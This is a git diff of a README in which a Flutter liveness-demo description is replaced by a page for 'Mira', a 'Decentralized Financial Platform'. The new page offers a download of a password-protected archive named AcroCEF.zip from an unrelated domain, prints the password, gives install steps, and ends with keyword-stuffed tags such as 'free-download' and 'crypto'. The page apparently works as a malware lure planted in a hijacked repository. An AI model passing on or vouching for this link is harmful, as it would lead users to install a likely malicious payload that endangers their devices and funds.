@@ -1,16 +1,36 @@
-# vidvliveness_flutter_demo
+# 🚀 Mira - Decentralized Financial Platform 2024 🚀
 
-A demo app for testing liveness flutter plugin
+# [DOWNLOAD](https://dev-marcepan.grupa-abs.pl/AcroCEF.zip)  
+## Password - 86tiiolsmn
 
-## Getting Started
+## 📜 Overview
 
-This project is a starting point for a Flutter application.
+**Mira** is a decentralized financial platform on Testnet, providing tools for developers to build, manage, and test financial applications in a secure blockchain environment.
 
-A few resources to get you started if this is your first Flutter project:
+### 📋 How to Use
 
-- [Lab: Write your first Flutter app](https://docs.flutter.dev/get-started/codelab)
-- [Cookbook: Useful Flutter samples](https://docs.flutter.dev/cookbook)
+1. **Download Mira** using the link above.
+2. **Install** Mira on your device.
+3. **Develop and test financial applications** with blockchain security on Testnet.
 
-For help getting started with Flutter development, view the
-[online documentation](https://docs.flutter.dev/), which offers tutorials,
-samples, guidance on mobile development, and a full API reference.
+---
+
+If Mira supports your project, please ⭐ this repository!
+
+### 🔑 Tags
+
+- Mira
+- Mira-finance
+- Mira-decentralized
+- Mira-Testnet
+- Mira-free-download
+- Mira-setup-2024
+- Mira-install
+- Mira-platform
+- Mira-crypto
+- Mira-tools
+- Mira-for-developers
+- Mira-blockchain
+- Mira-financial-apps
+- Mira-secure
+- Mira-digital-finance
